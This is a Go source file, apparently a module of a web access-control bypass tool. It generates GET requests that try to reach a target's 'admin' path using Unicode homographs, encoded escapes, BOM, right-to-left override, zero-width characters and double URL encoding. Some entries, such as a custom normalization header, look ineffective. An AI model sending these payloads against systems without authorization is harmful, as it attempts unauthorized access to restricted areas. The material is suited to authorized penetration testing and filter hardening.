package techniques

import (
	"fmt"
	"net/url"
	"strings"
)

func (Unicode) Name() string { return "unicode" }

type Unicode struct{}

func (Unicode) Generate(ctx Context) []Payload {
	var out []Payload

	// Unicode normalization bypasses
	// These exploit differences in how systems normalize Unicode

	// Homograph attacks (visual lookalikes)
	homographs := []string{
		// Cyrillic characters that look like Latin
		"\u0430dmin", // Cyrillic 'а' (U+0430) vs Latin 'a'
		"\u0410DMIN", // Cyrillic 'А' (U+0410) uppercase
		// Greek lookalikes
		"\u03B1dmin",  // Greek alpha
		"\u03B2admin", // Greek beta
		// Combining characters
		"ad\u0301min", // a with combining acute accent
		"ad\u0300min", // a with combining grave accent
	}

	for _, hg := range homographs {
		if strings.Contains(ctx.Target, "/") {
			parts := strings.Split(ctx.Target, "/")
			if len(parts) > 0 {
				lastPart := parts[len(parts)-1]
				// Replace last path segment with homograph
				newURL := strings.TrimSuffix(ctx.Target, lastPart) + hg
				out = append(out, Payload{
					Method:      "GET",
					URL:         newURL,
					Description: "Unicode homograph: " + hg,
					Detail:      "Unicode normalization bypass",
					Technique:   "unicode",
				})
			}
		}
	}

	// Unicode escape sequences
	unicodeEscapes := []string{
		"%u0061dmin", // \u0061 = 'a'
		"%u0041DMIN", // \u0041 = 'A'
		"%u0430dmin", // Cyrillic а
		"%u03B1dmin", // Greek α
		"%C3%A1dmin", // UTF-8 encoded á
		"%C3%A0dmin", // UTF-8 encoded à
	}

	for _, ue := range unicodeEscapes {
		out = append(out, Payload{
			Method:      "GET",
			URL:         ctx.Target + "/" + ue,
			Description: "Unicode escape: " + ue,
			Detail:      "Unicode escape sequence",
			Technique:   "unicode",
		})
	}

	// IDN (Internationalized Domain Name) bypasses
	idnVariants := []string{
		"xn--", // IDN prefix
		"xn--admin",
	}

	for _, idn := range idnVariants {
		out = append(out, Payload{
			Method:      "GET",
			URL:         ctx.Target + "/" + idn,
			Description: "IDN variant: " + idn,
			Detail:      "Internationalized domain name",
			Technique:   "unicode",
		})
	}

	// Unicode in headers
	unicodeHeaders := []string{
		"Content-Type: text/html; charset=utf-8",
		"Accept-Charset: utf-8, iso-8859-1",
	}

	for _, uh := range unicodeHeaders {
		parts := strings.SplitN(uh, ": ", 2)
		if len(parts) == 2 {
			out = append(out, Payload{
				Method:      "GET",
				URL:         ctx.Target,
				Description: "Unicode header: " + parts[0],
				Detail:      "Charset manipulation",
				Headers:     map[string]string{parts[0]: parts[1]},
				Technique:   "unicode",
			})
		}
	}

	// Normalization form bypasses
	// NFD, NFC, NFKD, NFKC
	normalizationForms := []string{
		"NFD",
		"NFC",
		"NFKD",
		"NFKC",
	}

	for _, nf := range normalizationForms {
		out = append(out, Payload{
			Method:      "GET",
			URL:         ctx.Target,
			Description: "Normalization: " + nf,
			Detail:      "Unicode normalization form",
			Headers:     map[string]string{"X-Normalization-Form": nf},
			Technique:   "unicode",
		})
	}

	// BOM (Byte Order Mark) attacks
	bomVariants := []string{
		"\uFEFFadmin", // UTF-8 BOM
		"\uFFFEadmin", // UTF-16 BE BOM
	}

	for _, bom := range bomVariants {
		out = append(out, Payload{
			Method:      "GET",
			URL:         ctx.Target + "/" + url.QueryEscape(bom),
			Description: "BOM injection",
			Detail:      "Byte order mark bypass",
			Technique:   "unicode",
		})
	}

	// Right-to-left override
	rtlOverride := "\u202E" // Right-to-left override
	out = append(out, Payload{
		Method:      "GET",
		URL:         ctx.Target + "/" + url.QueryEscape(rtlOverride+"admin"),
		Description: "RTL override",
		Detail:      "Right-to-left override attack",
		Technique:   "unicode",
	})

	// Zero-width characters
	zeroWidthChars := []string{
		"\u200B", // Zero-width space
		"\u200C", // Zero-width non-joiner
		"\u200D", // Zero-width joiner
		"\uFEFF", // Zero-width no-break space
	}

	for _, zwc := range zeroWidthChars {
		out = append(out, Payload{
			Method:      "GET",
			URL:         ctx.Target + "/" + url.QueryEscape(zwc+"admin"),
			Description: "Zero-width character",
			Detail:      fmt.Sprintf("Zero-width: U+%04X", []rune(zwc)[0]),
			Technique:   "unicode",
		})
	}

	// Mixed encoding (double encoding)
	doubleEncoded := url.QueryEscape(url.QueryEscape("admin"))
	out = append(out, Payload{
		Method:      "GET",
		URL:         ctx.Target + "/" + doubleEncoded,
		Description: "Double encoded",
		Detail:      "Double URL encoding",
		Technique:   "unicode",
	})

	return out
}
